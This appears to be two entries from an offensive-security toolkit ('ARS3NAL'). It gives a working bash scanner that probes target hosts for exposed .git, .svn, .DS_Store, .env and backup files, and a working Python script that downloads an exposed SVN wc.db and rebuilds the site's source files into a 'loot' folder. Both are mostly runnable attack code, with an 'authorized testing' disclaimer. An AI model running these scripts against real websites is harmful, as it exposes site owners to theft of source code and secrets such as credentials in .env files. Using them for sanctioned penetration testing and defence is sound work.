entries.title: Source exposure check (/.git /.svn /.DS_Store /.env)
entries.body:
A quick check for whether **VCS service files and configs** are exposed: `/.git/HEAD`, `/.svn/wc.db`, `/.svn/entries`, `/.DS_Store`, `/.env`, `/.git/config`, backups. For each path it looks at the response code and the presence of a signature in the body (for example, `ref:` in `.git/HEAD`, the SQLite magic in `wc.db`) to weed out false 200s from a custom 404 page. If something is found, you can then dump the sources with the matching tool.

> This is only an indicator. `.git/HEAD` with a body of `ref: refs/heads/...` = the repo is exposed -> grab git-dumper. `.svn/wc.db` (SQLite) = old SVN -> svn_dumper. `.DS_Store` = a macOS file listing -> a dsstore dumper.

```bash
#!/usr/bin/env bash
# exposure_check.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
set -uo pipefail
BASE="${1:?usage: exposure_check.sh <https://target | hosts.txt>}"
UA="ARS3NAL-recon/1.0"

# path|signature-in-body (empty = a 200 code is enough)
PATHS=(
  ".git/HEAD|ref:"
  ".git/config|[core]"
  ".svn/wc.db|SQLite format"
  ".svn/entries|"
  ".DS_Store|Bud1"
  ".env|="
  ".env.bak|="
  "config.php.bak|"
  "backup.zip|"
)

check_one() {
  local base="$1"
  base="${base%/}"
  for item in "${PATHS[@]}"; do
    local path="${item%%|*}" sig="${item#*|}"
    local url="$base/$path"
    local resp code body
    resp="$(curl -sS -A "$UA" -m 12 -w $'\n%{http_code}' "$url" 2>/dev/null)" || continue
    code="${resp##*$'\n'}"; body="${resp%$'\n'*}"
    if [ "$code" = "200" ]; then
      if [ -z "$sig" ] || printf '%s' "$body" | grep -qiF "$sig"; then
        echo "[FOUND] $url  (HTTP $code)"
      fi
    fi
  done
}

if [ -f "$BASE" ]; then
  while read -r h; do [ -n "$h" ] && check_one "$h"; done < "$BASE"
else
  check_one "$BASE"
fi
```

Run:
```bash
./exposure_check.sh https://target.com
# or for a list of live hosts:
./exposure_check.sh live_hosts.txt
```

entries.title: SVN dumper (extract sources from exposed /.svn/ wc.db)
entries.body:
Recovers sources from an exposed `/.svn/` (SVN 1.7+). The logic: it downloads the `/.svn/wc.db` database (it is SQLite), reads the `NODES` table - it holds a path (`local_relpath`) and a checksum (`checksum`) for each file. The actual content sits in the **pristine store** at `/.svn/pristine/<first 2 chars of the hash>/<full hash>.svn-base`. The script downloads every pristine file and lays them out under their original paths. An original stdlib + requests implementation.

> Works for SVN 1.7+ (single wc.db). The checksum in `NODES` is stored as `$sha1$<hex>` - the pristine file name is taken from it. If pristine returns 404, access to that folder may be disabled on the server, in which case the source cannot be retrieved.

```python
#!/usr/bin/env python3
# svn_dumper.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, os, sqlite3, tempfile, requests
requests.packages.urllib3.disable_warnings()

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL SVN /.svn/ dumper (1.7+)")
    ap.add_argument("-u", "--url", required=True, help="target base, e.g. https://target")
    ap.add_argument("-o", "--out", default="dumped_svn")
    a = ap.parse_args()
    base = a.url.rstrip("/")
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL/1.0"; s.verify = False

    # 1) download wc.db
    r = s.get(f"{base}/.svn/wc.db", timeout=20)
    if r.status_code != 200 or len(r.content) < 100:
        print(f"[-] wc.db not accessible (HTTP {r.status_code})"); return
    fd, dbpath = tempfile.mkstemp(suffix=".db"); os.close(fd)
    with open(dbpath, "wb") as f:
        f.write(r.content)
    print(f"[*] wc.db downloaded ({len(r.content)} bytes)")

    # 2) read NODES: path + checksum
    con = sqlite3.connect(dbpath); cur = con.cursor()
    cur.execute("SELECT local_relpath, checksum FROM NODES WHERE checksum IS NOT NULL")
    rows = [(p, c) for p, c in cur.fetchall() if p]
    con.close(); os.unlink(dbpath)
    print(f"[*] {len(rows)} files referenced")

    # 3) for each, download the pristine .svn-base
    os.makedirs(a.out, exist_ok=True)
    got = 0
    for relpath, checksum in rows:
        # checksum in $sha1$<40hex> format
        h = checksum.split("$")[-1]
        if len(h) < 2:
            continue
        pristine = f"{base}/.svn/pristine/{h[:2]}/{h}.svn-base"
        try:
            pr = s.get(pristine, timeout=20)
        except requests.RequestException:
            continue
        if pr.status_code != 200:
            continue
        dest = os.path.join(a.out, relpath.replace("\\", "/"))
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        with open(dest, "wb") as f:
            f.write(pr.content)
        got += 1
        print(f"    [+] {relpath}")
    print(f"[=] recovered {got}/{len(rows)} files -> {a.out}/")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 svn_dumper.py -u https://target.com -o loot_svn
```
